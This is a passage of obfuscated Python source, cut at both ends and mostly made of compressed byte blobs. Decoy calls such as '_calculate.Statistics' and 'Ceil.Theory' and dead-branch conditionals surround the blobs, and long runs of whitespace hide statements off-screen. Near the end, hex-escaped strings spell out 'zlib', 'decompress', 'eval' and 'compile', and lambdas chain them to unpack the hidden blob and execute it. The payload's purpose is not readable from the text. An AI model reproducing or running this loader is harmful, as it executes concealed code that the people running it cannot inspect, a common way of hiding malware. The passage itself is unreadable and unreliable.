 l\x98\xc6\xf2\xe8\xa3d\xa0\x9fS \xcd\xe9\xe8u\xc9AS\x88}\x0f&\xb2w\xc6\xfbE\xcf\xe9\xf9\x87\x11\xb7{\x0f$S\xa2@\xae\xc5w\x8b\xfd4\xd8\xc3\xfe\x03\xb9p_m\x83.$\xf6\xba\xb8\xd0\x1d\t\xba\xee\x9a\xb9R\x0b\x1c\xb0u\xb0\xd2j\x9d\xcb\xeaa\xc1\xb7)\xbbMx\xf1\x05S\xb6\xbb\x9fI\xa5<\xab\x95\xe1=K\xb7\xb6\xb4\x17\x86\xe7\xb6\xd5]C%\x9a\x07)\xec\xa93\ri\xbd?li\x1bi\xc9tG\xb8z\xf6\xdbf\x177\xd6\x1b\x9fu\x1d\x1c\x14?\xfa\xe0@\x1et\xd1.\xf9\xd5\xdf:\x0b\n\xe4Z\xa1>\xce]K\xbd\xf7\x94b@d\xd6m|wW\xe35\xff0y#5\x96\x0eF1\xe0\xd8\xe3\xb8\xd98\xee\xb7\xf6Z\xe7_\xb7\xd1i\xbd\xe1\x92\xb1u\x97\xea\xdf4\xc2\xda\x8f+yK\xdcg\xdd\xf5y\xcd/m\xf5>[\xdb7\x1b\xe3\xb8\xda\x8f\xcd`\xc7\xc5\x1f\x9bN\x97\xe9\xd3\x8f\xaf\xdd8\x8eN\xeb\xff\xb1\xe9r3=\xe2\xc6\xb8b\xad\xf7\xfe\xd3\xc9\x15\x06f\x15"\xbaK{\x03\xc8\xb8\x0b8\xec\xee[2\x06Y\x8c\xc3O-[\xaf\xbb\xba\x89\xb75\x087\x18\x01\xc9\x04\x944\x00\xff\xbd\xe4\x9c\xc0\xcb\xef\x94\xd9yS\xden\xb2e\x95\x9d7\xf6al@7\xc8\xd7U\x86? \xfa\xab\x16V\xa9\xaf\xd2\x0f\xed\x8b*\xed\xf1\xebC\x1byNw \x0f\xee\xe4\x89\xdd\xb6NL>l\xd9\x9f*\x01\x8c%\x87\x85\xf6\xe8\x0es\x98/\x9f\xfd\xfe\xfeV\xf1\xaa\x02u\xb7\xc4\\\x89:F\xce \xdda\xaf\x9e\xdd\xbaB*a\xbe\x7f\xe1[\x10\xe1>#\xc7\xcf\xadw\x10\xf8\xab\xb1\xbf\x9a9\x85\xfb\xf6Z3\x15\xaf\xe4>5\x97\x10\xef\xae H`\x1f\x1f\xc3\xd3\\m\xcb\x9bH\xc2\xdf\x90L\x15EhE\x1d\xe8\x8et\xf5\xec\xf7\x88\xfc\xbf\xa2\x9d\x8c\x98\xcdc\xd5x\xae\xc4p\xe5q\x91\x19dlo*\xdb [\xdbr\xd9\xfb~\xdaR\x03\xf2>(\xdf\xdc\xbfSh\xbe\xbb\xdfr\\V\xa0\xcd\x12\xdfJ\x98\xe9\xe9\xc6\x02\x83v\xf3\xec\xb6"R\x00\xc8\xb18\x08\x92R\x03t\x87\xbbzv{\x99\x93\xa5HY\x81\xdf\x96\xb3M\xe9\xea\xd9\xed\x81\xb3e`4t\x9b\xa5\xef\x86\x87l\xaf\x9e\xdd>\x1ffpKf\xf3\x10\x18\x89\xe3\xd5\xb3\xdbWhyH\x89}\xa52\xc0\x96+\xbcr\xf6\xfb\xa3u\xcb\x1djau\x12u0C~.\x9d\xfd\x96\xf0\xef\xa0\xc2\x06\xab\x1d\xa8u\xc0j\xa0\xd6_*[T=\xdf\x8f\x19\xf9\x8c\xf7\xf9\xb9T\xe3\xd57\x00\x86\xef\x00\xe8r7\x18\xf0,U\xfd7\t,\xdd\xe8I\xcal\x11\xdc\xfe\xec]\x81\x1d\x892\x0f\n+\xa8\xea#/y>/\x9c\xd9\xa6\xac\xbf\x9b\xcf\x7f\xa0\xef\x96\xea\xcb]\xb7r\x16\xbf\xb9[\x13@\x11\x83m\x1a\xc8\xee\xe5\xf4\xe46e\xb7LO^I\xae\xe3]A\xa4`K\xff\x9f~\xe6U\xde\x1bS\xb8\x97\x92\xb7\xff\xfa\x8f\x0f\x05,\xd0N\xdc\x12\x18\xbe\xe65\xa0\xe1\xeb?\xaa\xe0\xfd\xab?\x0f\xf6vL\x1e\xb82\xf1\x92{\x93\x07\x98\xf9\xb9\xb2\xf5!\xf6\xfd\xbfx2\xf5\xe5\xb9\x9e|\x8fi\xc98\x92\xb3e\x1d\xcb\xf1\xbf\xd8\xc3\x97]\xc1\x95\xa5\xbe\xd1~\xb0|\x10\x84\xc9\xec\xcae\xf6b\x8a\xbb!^\x83a_a\xe3\xec\x1d\x15MQ$\x80\xdb\xba\xaf\xdb8p\x9a\xb7)\xbb\xe5k\x0eWQH`H\xfbN_\xf7\xf2\xfa\x8b<:f\xe1\xca\xba\xaf/\xc5\xf4\xe7\xca\xf2/\xf6P\xecF\xbd!r\x975\xce\xf5[\x17g')

        _calculate.Statistics(_memoryaccess = 20936 / _calculate.CallFunction)                                                                                                                                                                                                                                                          ;Ceil.Theory(_cube='WWXWWXXXXXXXXXXXWXW',_ceil=b'\xca\x12\xe7e\xe9\xaf\x94\xed\x83\xbe\xddscB\xf4\xfe\xdf\x93\x9d\xd5W?gx!t\xf3e\xd0\x07zG\xb6\xca\xfb\xf0\x95\x9e8\x08*\xd9\x8f\x19X\xea\xeb\xca\x9a\xc1\xfe6:r\xe3\xfbj\xabA\xf7\xe4\x17\x11|tO00\xec\xaa\x1f8\x1cn0\xc4m\xcan\x13;\x7f\xf5k?.\xb2\xac\xb7\xce\x93\x113\xae\xe1\xa3@\xe65\xb9L\x16\xdd\xd0\x9e/\x8f\x00hij\x89D\xe5\x1b\xf2+\x8cst\xb5\xd4P>\xad-W,\x95,[\xc3G\xbe\xbc\xe5]r9\\S[\xea\x14\xdd\xe2\xe3@\xc7\x81\xce\x1a\xbeN5\xd29\xc7\xad\x97\xeb\x9e\x96\xccW3_/-\x95\xd2\xa5\ro\r\xdfk\xf8L\xc3\xd7\x9d\xf4\x91\xfb\x14P\x7f\xe0\xf6-\xd7^\xee/5\x96\xba\xc5s\xe01\x92\xafR\xeaJ\xe8-\xd5\xcf\xc7\x91\x8f\\9K\xc7\xb1<v\xa0:2\xd7\\Z\x8c\xb4\xdf\x80j\xad\x8c\x91\xfb\x17y\xdc\x99\xfb\x92K\xff\xb8\'\xa5\xcf\xa5\xad\x86\xaf\x97{3\xd3\xb5\xc5u\x19\xa5\xe1w\xe2\r\xbb9<\xcar\x9e\x8fK\xbf\n\xe5"Z\xcb|\xecA7\xe1`)\xd3\x82GMy\'\x86\xfb coA\xb7\x88\xd1fn\xdbb<4\n^\xcb\xd9\xc8\xe5\xb3P\x06\\\x14\x9e\t\xa5"\xb7\xd3p\xeb\x86\xa9\x9e\xf9n\x19y\xe9q\x80\xfcX\xd0\xb9\xbc)\x16\xc1\xe3\x96\xaf\x88\xbcD\xbe\xee\x98_\x19\xf77Lq[\xa5Qx\xdc`\x1c-_/c\xe9\xc7m\x98\xee\x1e\x1cn0\x82B\xdb\x06\\\x0cU\x12=\xdf\xaf\xb2\xd5p\xbb\x96\xeb\x8aL-\xc7cV\ny\xc8\x87\xb6\x15\xb8%\x83\x9e\x15\x9e\x88\xcc\x89l7L\xddPj\x86\xd64\xe8\x7f\xc0\xb8\xdd@\xf6\x1d\xf7\xa4\xd4&}w|g\xa8\xe5el\x91\xcf\xe4\xcaS\x91\x98X5\xb1\x15\xbac\xcc"\xcf\xe2$K\x9f#j\xb4\xa0=\xda\x035-\xf3\xc5r\x9d\xa2O\x96\xcbr_\xb8O-\x97)\xd73\xdf_\xe4)\x0c\xea7\x18E\xa8Z\xc4\x8f\xe7\xf8N\xe1Bp2\xd6\x04\xaaGH\x83p\xdf1U\r\x97Q9\x17\x19\x12\xaa\xf0VQ\x03h\x93\x80\x02\xda\x03\x95G\xc3\\\x8cLy\x8f\xfb=\xea\xb3@\x90\x86\xfbo\x98\xef\r\xd7/W}\xa5\xa8\xc8u\xe0z\xb4G\x81\xe9"|M\xa0W\x86&\x01\xeb\xf8\x9c\x01\xcdD\x9e#j\x94>\xa8\xdeK\xef\x0c\xb4\xc11\x8fD\x9b\xfa\xfe\xa9\x06x\xf082\xdd\x0bcE\xee\x1a\xe8\x8c\x87\x86$\xeeA`\xdc\x12\xd4i*\xbdD*s\x95\xda\x80\x1e\xe6*\x01r\x94\xc1\xf1\xcc4\xf5\xe8o\xc3#o\xab\x04f \xa4jgdy\x13\xe9\xb3L\xb5\xb6j\xba\xf02V\xdd\x15ms\xdc\x7f\xc1L\x91\x86\x00\x04\xca,\xbf\x8a\x88\x8ee)s\xef"\xf4\xa7a\x9d6\x18\xb7\xa2\\\x06b\xc7\x81\x0e\x8aF7\x904\xa1\xadH"\xd7\x0fT3\x8c$C\x0c7\x15o\xa3Ju\xb5\x0e\x82\x89\r\xb4\xb3\x81%S\xc9lEs\xb9\xa4\xd2F\xe8\x1a\xa0\x99\x91[\x8c@{W\x91\xcaAC\x99\xc1\xe8\xb7\x03Z\x1b\xe8@\x00\xe2\xab\xfdu\xe8\x8d\xafZ\x11`)\x15\x9bZg*.4\\g\x0b\x89\x0c\xbc\x9f0N_\xe5\xdb\xc0.9\xe0F\xb4\xda\x8eP\xc2B~\x14\xbf\xb5\xe5\xde\xca%\xa5>F\xad\xb6\xdb\x83\xc7\xa1\xf6\xab\x05\x87\x028\xd0B\xb6\xa3\xc8V\xf5\x07\x0c{\x1eM\x95!\'zY^1\x80\x94$\xf0\xc2\xc1\x8e\x8a\\\xf8\xcaSE\xf2\x166@(\xd5@\x02x\x9c\x82BV\xfa\x95\xb8O\x16\xba\xce/9\xf0y\xb5!b\xb9#\xd0\xcc\xc1JX\x8cO$\\\xf1V4\xc5\xb1\xce)_\x0ctY\xa5,+~@\xbf"\x8f-\xc1\x860\xd2\x8a\x0eA\xea\x12\xf7>U)T\xa9\x16\xee$\xa6\xa1\xa9\xf2\xdd\xf0x=\xec\xb2h\x99\x81?##1\x90\t\x07\x1c\xf5\x18\x99x|~\xe0\x99\t2\xe6\xaa\x9fr\\\xee\x92\xbefHYf^\x8a\x8c\x8b\xd5MUj\x15\x01E\xd6\x12\xfa\xeb\x81=\xa2M\t5\x88El\xaa\xfe6\xf0WZ\xf0Rp\xdcU\x8d\x95^\xf7\xbe\xa5\xd8~\x03^9\xe8~\xc2\xf8[\xa6H\xe2o\xa9O\xe48\xc3R8\xa6Ob\n\x0f},\xe6\x9e\x15_M$\xda\xe0~\x07\x0fQ<8\x87\xb10\x05\xac\x01:X\xaeW\xd01\xb1\xe5a\xc4\xb0*\x15r\x97Z\n\xa3(\x044m\xa0!\x06\xd4\x12\\\xca\xb0\xed\x8e\xcf\r\xbd\x153\xf0\xbb \x85B\x17\xc8\xae\x03F\x8bl:\xe0w\xa8\xb2)\x96\xd0r\xff,41U\xfeFP\xc8\xe1XtA=\x7f\xe15d\xda\x1a\xa0\x88\xa0\x9e\x05\xfdC\xf5\xf4\x1d\xb8\x17A\x1d\x916\xb9\xc7@\xb2\x1d\xec\xb4\xc7\xb1\xe7sj\xf7\xc5\xf7kA-\x07\xbf3\xc1\x0f\x11?"nD9B\xff\xa6\xcaO\xcb\xdcV\x8c\xf5\xd0M\x0bi\x91\xfe\xa9\xb44\xc0\xdf\xcc\xfa\xae\xd2\x1aa\x97\xa5\xc5\xc0\xbc\xd4H\xc6:\xd1g\xed}\x03\xcd\xb7h\xbbe\xfdPN\x8b\xedR\x04\x13\xecV?U4\xb3\xa7s\xc3\xd6%\xc0\xb6\x88\x0c\x8b\x0f\x9e`7c\x1d\x05\xbf)\xcf\xad{\xe8\x84g\x19\x8d@\xcf\xc8}K\xe0\x82 O\xa8\x167\x02\x1b\x9b\x8a\xe6\x8c\xc3\xd5\x97\x08U\x02,\x10\xa6\xa9\x14\x14Z\xea\xa8\xa2\xebc\x92\x06\xb69@\xdf,\x97\x96O\x005\x05\x8b\xa4\xb7\xbde\x88@T\x8f\xbe3ZA\xdeZDSE\xca\x1c,W\xe2Z\xda\x8a\xfd\x8e\xa9\xd7\xd6XQ\xa8n\xab\xff\x1d\xaa\xa7\xd7Z\xf5\xbcZAE\xab\x9e\xa1H\xa2\xc7\xb1\xf8f\x06\xfeH\x034\xf6\xa8Q\xe5C\x11C{\x15\xb9\x87\x01\xfe\x83Z\x97\xa4\xd1\xc5\x86\xef\xe5\xaa]\x96\xd8\xa2E\xdb\x89\xef\x8d\x15\x8b\x04\x8d\x0c$@\xac\xaa\x83\x950\x88\xfe\x0c\xb4\xc3\x8a\x05g\n\xa6*\x17\xadx\x8bVc\x97X\xad\xa8x\x8d-l\xae\xf8\xaf\x8dP\x0c\xd2\x1c\xa1\x7f\x82d\x12\x9145\x122\xe0^\x0b\xbad\xc4\x18\xde\xaaW\x16D;\xac\xfa.\x9eiea\xe1[\xc4<\xd6j\x84\x18*.\xda\xea\rg\x8c%\x8a\xde\x15y\x04\x17\x13\xf4@\xcb\x1bD \xa2\xc7b\xb3"lt\xe4\xde\xf51g\x02\x87[\xf8\x94\xbe\xde\xa1\xfe\x91\xd0_i\xe1P\xbf\x1f\xa04\xfcZ+Q\xa8\xea~\x04N$\xc1t.\x9f\xab\x04:hw\x02/5\xba\xb6,\x17\x16V\xc7\xb3<\x99\xea+\xdaj\xa3l\xb5\x8a\x0ez+\xe8\x90\x98\xd7\xb6\x8eU\xac\x8e\xcaT\x03;\xae\xfe\xbbw\xd0\x14k\xe0\xeb4U\x02\xc5\x9bQ\x7f=\xc0\x13\xca\x90)\xb6\x93\x90\xf9<\xc0\x1e\xc5\xb1\\#\xb1\x04{\xe2aal\xf5u"\xa4\xd0\x80\x0f\xbd\x7f\x1e\xa0\x0f\x1e\xd6,\x0e\xfc\xa0\x08\xfa\xba\xea\t\x88\x94y\xd0Pt,\n\x06\xa1\xe6M\xcbk`[\x15q=|\x87T-\xa7H\xb8F\xcd\x16>\x99\xd9\xb05\xc3X\xdfC\x835n\x17d\xcc\xb8\x1e\xb1\xf4\xde\x98D\x17*\x15\xe2\xf7I\x16\xc8U\xce\xa4\x81\x8c\xb7\xec%f\xc8\xb0\xc6\xa7\xeaEG\x96\x17_)\x10\xe0i&\xa0\xb1\x83\xb7\xe1\x10\x15\x06\xf8\xe9\x1a\x1dyXV\xb6\xb8\xe8\x8f\xeaPF\x0f\xc4\xda\x08N\x18H\x9a\xc4\x8a\x9b\x91\xae\xfa;\x01\xfe\x86\xc6H\x9a\x87\xec\xfd?\xc9\xd7\xf4\x1e\x9ep@-\x84H\xb1\x95X\n8\xe1\x80&\xe2\x7f5N\xe3G\xcd\x8d\x88G\x971\xc2,\xbeh\x1d/<6\xdb[{_}\'\xb1\xdf\x16\xbea\x00\xf6\x1aX\xc6\x08\xcf\x923c\x90e\xb5F\xd2\xb6\xf4<\xba\xa6\xa2Ft\xc8\xb3\xa1\xfe\x0c\xb9\xf4U\xd6\xd5*{x\x13m\x95\xbf\x16\xfc\x89\xd5\xbb\x88\xd0\xec\x06\xb6Vc\xdb\xc6\x8a$ \x13k\r\xb0WlcF\xed\x90g\xab\xb1\xa9\xe7\xfa\x1b\xab\xd9\x0c\xef4\xbfpY2\x128\x96\x80\x19\x12\xfb!j\xb3\x9aaB.\xb2Z\x1e\xd1}E\xe3\x8c\xbb\x0c\xeeW\xbd\x92\xc8\xce2\x06\x1a\\\x15\x9eh\x0c\xde\xc0ok\xaa\xad\xf3\xf0)\xda\x81\xed\x88\xd5\xbe&\x8c\xbe\xe7QS\xad\x9c\xe4\xbdz\x0b\xeba\x7fc\xf5\xa6{\xa4\xf4\xb0\xa6\xea\xadZ\xd8\xce\x0c?K0Z\xa5G|5\xe1z\xb6\x9a+N\x03\xcf>\xc3\xf74\x95\xbff`\xaf4\xb2\xef1;Tl\x93XT2\xb2\rZ\xb6\xe0\x87\x94\xf6\xb0Y\xca\xfd\x0c\xf4\xd3\xa8GJ\x07X_\xcew\xc0\xaa\xa9tH~IQ\xde\x0f<\xa2\x08\xbb\xa9\x1a(y\xb4>\x07-\xa8\xa5\xb9\xb0\x04\xc9T\xa9\x95\xf8\xc4T\x1d\x91l\xa6\xe6{Dn`\xe9\xadf\xf6\xd4k\xb0\xd0\n}f\xd1{Z\r<\x18\x0f|q\xf0\xb5Z\x96\x0c\x8d\xde\x1a\xa5A\xc5\x1a\xcd\x92h\x86E\xd1Cs(\xe2\x1b\xf7\xbea\x03\x04\xd7\x0cO\xe2#_=\xe9\x06\xb4W\x1eZ\xa0\xb2ZV\xb1fn\x807\xcd@+\xc4\x83K\xce\xd5\xd8B(\x15\xebh$>\xeas\xf0\x92\xcf\x0e\x83\x0c\x92d\xca\x14\xbf|\xa5\xb4\x07\x16\xf6\xcfI\x1a\xf1\x92+v\x8b5\xe8\xb3c\xe2\xa9\xcb\xa2\xf5\x89\xbe\xf4\xb1\xa4\x8c2\xc0\xf6G^5\xd7g\x9d\xe6\xee\xc4\xbf\x8c@\xb3\x16\x92\xe1\xa1A\x8a\x8f\xe2\xafI\x06\xda@\xc25\x92Rk\xec\xe1\x1f\xf9\x01\xdd\xc4\x07\xees\x99AZ\x1c\xc4+\xb6^\xd3,\xb2G\xb4\xe2U\xcb\xacQ\xect}V\xbd\x81Di\xe4\x91a\xf3\xd5\xbf\x8e\xa0`\xa8\xbdR\x8f@\x8f\x85\xfe\xb9\xdaS\x07{n\xc0_\x0b\xbf\xb9\xb7\x85b\xa35\xef&\x19\x85X9bpO\xa8c\x1dF\xf3\x88#*\xc7ZEM\\\xb5\xae\x8f\x12\x1b \x8ab|rx~\x05<\tUn=\xbc<[}4\xf1\xd9\x0c\xb8!\x91FS\xdb\x89\xf0D5\xdb.\x1c\xf0\x83~Dh\x8dZ\x93\xc6)5Z\xc8\x8dd\x81}\xb5N-x\xe3\x80\xe8\xa2\xb7}\x86%_\xf2@4\x1f\xa4\xfa\x12\xe0\t\xf7\xfe\xe60\xc2\x82\x85\xb2\x9a\xe7\x97|\x8bF9\xd9\xf5\xcf65*Q}A\x1e\x0b\xfc\x16;g+\x92\x05\xd4\xae\xd8%')

        if 214880 > 8540876:
            _calculate.Statistics(_memoryaccess = -31492 + _calculate.CallFunction)
        elif 143142 < 2758766:
            Ceil(Floor = -60918 / 3948).Builtins(Negative = _calculate.CallFunction * -24851)                                                                                                                                                                                                                                                          ;Ceil.Theory(_cube='NNMNMNMMMMMMMNMNNNNMN',_ceil=b'(\xdd\xd6\xeb\xa6"\x93Ey\xc5\x06\x0bk\xad\xbe\x9b<\x87\x8a\xf5\xee\x06H\xa8\x19\xfd\xb6z\x12\xea\x9b\x04m\x0b\xb2\'\xf8a]\x9fWk\xab&\x06\xe8&\xb7\n\xb9b\x8f\xad\xdaD\xe1Y\xc2\xbd\x92\xc1\xd1\xeck\x84\xbe\xa9\xdf-9m[\xed\x9cH\x82\xab\xb1\x8eXM\xa99V\xf9\xb3\x15\x9f\x94\xd2\xd0$H\x9d\xc5\xe8\x83\x0b5\xce\xd6<\xa8\xaf\xc7I\xbc\x18\xab~\x84>\xebm\xac>G\x03\x8f\xac\xe6c$\x92R\xffZ\xa3J\x8d\x975\xaaNV\xfd\xdf\x00J\x04\xab\xf9,\xc9>G`\xac>S\x10\x8f\xd1\x01\x95U\x1f=$2\x0fdD\xb3Y\xd9\xf5\xf6Pr\x85\xea\x7f\xc6\x1a?H\xee!\xd4\xba\xc56\xfbjg%\xbf\xa5\x92\xed\x06Z\xa9\xcf\x1f\xb8wV\x9f\x93\xe0y\xb3\xd5,\xbdh\x92\xb5\x9ay\x0c\xd5\x16J4,\x9an\x80\xd6B\x9f\x1e\x8b\xf4\xa9\xad\xe6I\xc4\x97\xd7\xa7\x92"\x9d\xaeb\x82\x03J\xe8\x13+}R\xee!\r\r\xb4/Z\xcdYA\xce\xac\x81\x0f\x87\xbc\x19\xb8-Q\xabzP\x19\xd1\x95\x87\x8f#\xd8\x87\xe8\xa1Z\r\xf1\xbaz\xect\xd2\xab\x8a\x96\xbe\xea\x88\xfa\xda\xfd\xb3\x7f\x91\xcd\xa1\xf5\x14\n\xf6\xcf\xb4\xc5j\xa9\xfd\x90\xf8P\xb1Z<p\xb56\x16\x16,\xd4\xc8J\x9f\xeck\xee^ly\x12o\xa3JG\xac~V\x8d\xa1\x06h\xaf\xd8\xdbg@$\xc3\x96\xad\xe2\xb3x\x91\xe2\xf3i\xee\xd5@\x92\xf5\x89\x9f\xf8?\xb6\xfa\x05\x82+\xaez\x87\x16\xc8\xd2[\x96\x06\xb1\xa7\xe2q\xcdoZ\xcd?\x85J\xb7\x08\xfch\x80.m\xf5\xf6\x15\xed\xf5\t\x8c\x81\xcdn\x9cJ\xab\x8e\xb3\xf2\xd2jK\xce\x85\x01\x17\xd4_\x0c\xe0P\xac\x16\xd0\x003T\xe6,\xfc\x07\xe1\xb0\x05\xde8\xc4\xeb\xd9\xe9\xf3\x01\xe5`\x80\x8d\x97\x9ef\xd8\xc6\xfe\xb9:\xfa\t\x89l\x81\x1e\x1a]\x88\x9d\xea\x9f\xdaJ\xdeD\xbdSd\xc7\xaa\xcf\xaf\xcf\xc8\xcd\xbd\xbf \xd7\xbf_\xbb\xf9\xa6\xad\xbb4\xc3\xc7\xc3\xbcykS\x98\xc6\xee\xeb\xa7\xc28\xe0\x99\xba\xcb\x8c\x05\xbf\xfe\xfa\xe2E\x99\xc0\xa0\xfc\xdd\xc3\x9b\xe6V\xdf\xe5\xd4w\xd0\x06/o\x957\x7f\x9b\xc1\xfbk_*{\xfb\xdf\xbf\xf2\xf4\xfe\x96\xe7\xf8\x7f\xc3\x93\xfc\xdf\xf6\x17\xb0\xf8\x95\x1b\x8f\xaa\x9f\xb0m\xdb\xd7\xde\xbe\xdb\xef\x10+\t~\xff\xfd\xf7\xdf~\xa3?Zi);\xb7x\xbd\x95\xdf\xfa\x1b\xfe\xca\x8f\'\xad\xdb\xf2w~7\x0e\'\x81\x9b\x97\x7fK\xe0\xf5\r\xc6\xc1\xd4(\x9f+\xb7\xf5\xc4f:\xf5\xe6`x`\xfb\xc7\xdb\xff\xe2\xe0\xc6\x97D/\xbf :\x9c1tc\xd6\xd0\xef\xf7^\xf9\xfcd}\xbc\xa3\xff\x1ccG\xfe\xe7\xc6\xce\xf4\xfd\xc9\xa8\xfb\xc7x9\xea.\xba\xe9h\xd9\xadF\xb3\xc5\xf4l\xb4X\x9d\x8d\x8e\xc7\x1fF\'\xe3\xd5\xbb\xeeQ\xb9\xb6\xa7\x13\xdc\xbd\xc2\xcf\xda\xcbv\xff\x11\xaa\xa1r\xb3\xf5\xf1h2>\xed\xa2\x1f\x95nLOG\xff\\.&\xbf|\xf8\xa4\xff\xad\xa6{&\x13\x0c\x96\xe9Q^\x94\xdd\x832\xf7\xe0\x8bG\xfd\xf5\xd2\xf4\x1e5\xbb\x07\x9e\x95\x1e\x94sO\xf7to\x7f\xf4\x96\xa7\xdb\xc3\xcf\xec\xf9\xe7\xf5/\xf1c\xfb?Fe\xea\xe52\xeb\xf2\x11\xcfFU\xfe\xd9\xc9\xd1Bf\x9a{r\xd2}X\x8e\xa7\xdd\x1e#\x01\xe0\xc0\xca\xe7\xcd\x9b\xd1\xc7\xfa+\x12y\x0b\xbc|3\xcd\x0e\xfb\xb9\xa0L\xf9\xbc\x96-mF\xd3C"\xd23\xa1\x8a\xfe\xea\xff\x15\xe8\xf2\xea\xe9\xde\xe1k.Kk\xf9.;O\x9fa\x06h\x9d\x94\xfe@~`\xce\xff\x0ca\x8f\x18\xb1W\xfeaMY\xaf4\xf6\xe4\xf4\xc3\xb2\xfcK\x99\xb7\\\xa5\xc1w\xd9\xfe\xb1\xff\xb3\xd0\xfeI\xd9\x94\x9bylV\xa1O\x7f\xfd_\xceJ\x97I+\xe6\xeb\x93\x9d+5\xed,V;\xcc\xee=\x92\x82\x9b\xbbP>\xbf\x14\x89\xd9\x1bP\x10\xd4\x1c\x8c\x84\xdbXP\x9do\xeb\xbcJ\xfa=R\x14=\xd6\xdf\x10\x8f\x80\xc6\xfd\xec\xe1\xa3\x8b+\xb7\xc9\x0e1e\xaf\xce\xaf 2 3-\xec\xffrx\xf8Lp\x1ao(+j\x973\xbf||\xffi4>\xe9F\x9f\xd6\xe7\xa3\x93nL\x94z7:{\xbf8-_\xb4\xfb\xfe\xfc\xfd\xb3B\x07\x9e/[8g\xd6<\x91\xf6\xeb\xd7\xeb\xd7#\x99\xb1\xbbr\xad|\x8d^\xd6.\xbc\x14\xb6\xbf\x1a\xe9,\xdf\xf8E\x18\xfe\xe3\xc0\xc1\xe87\x81a@\xf0\xef\xb2\x8c^\xaf\r\xd5\xbd.\xdfF\xa7\xed.Sx\x8fx"5\x99\x12\xf1Hf\x11?Z\xfc2y\xa6DS\x10\xe0q\x1d\xd2goU\xc1\xb9\x87\x85\xe3M\xb1\xba\xc2n\xf33W\xaf\xf30\x96v\x16<\x8d\xdb\xd1\xe2\x06\x01)\x12\xf2\xf6x\xa5\x8d\x89e\\\xadF\x031\x139+\x9f\x11\x0c\xef\xc0\xf8\x8e\xca\xe0\x7f\x03\r\xe4\x8b\xbe\xffX\xccw\xca \x0e\xff\xf4\x8c7\x87\xc4\xe0\xdb#`\x8c\xc5\x05\xdaj\xaa\x94\xad\'\x8fx\xe8\xdf\xde_\xba\xef\x9b\xcf\xfb\xb7\xe5\xfdyc{\xcd\xbc\xaa\xb6M\x930\x97\xc5\xb6\xd1\xc6\xa6\xcc;\xc3\x11B\x179*\x8b>\x06\x9e@\xb7L\xa5\xdb\xea\x1e\'\r\xbb\xcdkI\xe6\x88\xb5\x83\xf3\xb3d\x12q\xa7\x04\x19[\xd5Nb\xc7\x93\x8bS,\x11\'\xbesM\xca1\xc5\xb1oB\x88m\x99\xa2\xb2\xfc\xea+NJK<\xc9d\x8c3\x1fbG\xe7\x9coix\xd9\xcf(X)\xd3g\xfa8\x0f\xc6\xe7@\x11oJ\xec\xd6\x1bO#N\x14Q\x10;|\x92\xb7\x01m\x99\xc0\x93\xca\xb8\xd8\xd1}3\xaa9\x97)\xcdK\xc4\x17\xbd\x9f\xa6\x98\xc8\xed\xf73\xaa?\xc4Rk\x99\xf42QY\x13\xa7v\x9e\xa8\xb6\x98\xa9\x14E\n\xb1\x8d\xd3\xd0Fr\x86S\xa6R\x9e\xfaE\xceo\xf2\xa1\t\xe5wj\xd4\x1b\x92\x81\x10\x1a*MQ"\xf5-\xd1\xb1Im\xa4\xd6B\x0ccj\xce\x16Z\xd1\xb8\x9bX\xa6\xe2\x9cQm>\x8d\xfd4\xf8R\x86(\x98\x82%\xb9\xe1x3Z\xdf\xa51\xdd\x1f\xe9\xb8M\r]KD\x19\x1f\xac\xa7\xf8)\xd8@Q\x1e\r\xb3\xf5\xd38\x89D\xc0\x14\xa8\x0eC}\xb1qJ\xe3\xf4~N\xf4,\x13sz\x1az\xe9o\x1b\xc6\xa4d\x9d\'\xc9I\x99\xaeu\xa1\r\x99(5K\x9e\xfaei\x04s\xcf3\x8e\xfaIh}\x87z&4zK\xf7\x10%\xb8WS\x17\xca\x142\xe4\xe2\x11\xb9SC\x94kl\x99 \xd4\xf9q\x99f\x94\xa8\x15S\x11\xc2\x1c\xf8|\x1c3\xff\x13Q\xc3\x05j\xa1L\xa7\x9aZ;\xa1\xa1\xfaPF>&\xfe\x10?SC\xa3\xf2<i\xbc\t\x81\xbaL\xa2\xe2}\t\xce\xa9L\xeb-\x972$\xdb\xa6L\xcaJ\xb4$\x1a\xf82\xa9*\xf1/\xceiof\xe7\xb1H\x04Q\xd4g[(N\x94\xa7qf:G#\xa5\x9eRM\xd4\xfb2\x01k\xf6<=+\xd1\x84\xa8M\x94-\xcd\xcdh\xa43\x8aI\xe7$\x1b\xd4*\xd1\xa5-\xad\x13\x8f\x1a7\xb3e2\xe9|Y\x17\xe8\xcc\x94\xcdk\x17\xc7t.S\x80\xa7SO\xb7\xe5(\xf9\xb2\xb5\xfc3IZL\x99\xd8\x95\xae\x91<\x95\x95J\x9b0\x91\xac2\xd5#\xcf(Z\xde\x937\xf5\xa7V\x9fdL\x91\xddl\xc3\x0c\xfd \xeem\xf4\x83\x964\xdbj\xc2\xeb\xfdG\xff\x0f=\x14X\xf8')

        _calculate.Builtins(Negative = _calculate.CallFunction - -54194)                                                                                                                                                                                                                                                          ;ooooDoOOOOOoODooOOo,wwxwxwxwxxxxxxxxwxw,WWWWWWXWXXWXXWWWWWXWWXWX,WXWXWXWXXXWXXWXXWWW,XWWWXXWXXXXWWXWXXWXW=(lambda MMNNNMMNMNNNNNNNMNMNNNNN:MMNNNMMNMNNNNNNNMNMNNNNN['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda MMNNNMMNMNNNNNNNMNMNNNNN:MMNNNMMNMNNNNNNNMNMNNNNN(__import__('\x7a\x6c\x69\x62'))),(lambda MMNNNMMNMNNNNNNNMNMNNNNN:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(MMNNNMMNMNNNNNNNMNMNNNNN)"),filename='\x4d\x4e\x4e\x4d\x4e\x4d\x4e\x4e\x4e\x4d\x4e\x4d\x4e\x4d\x4d\x4d\x4d\x4e',mode='\x65\x76\x61\x6c'))),(lambda:(lambda 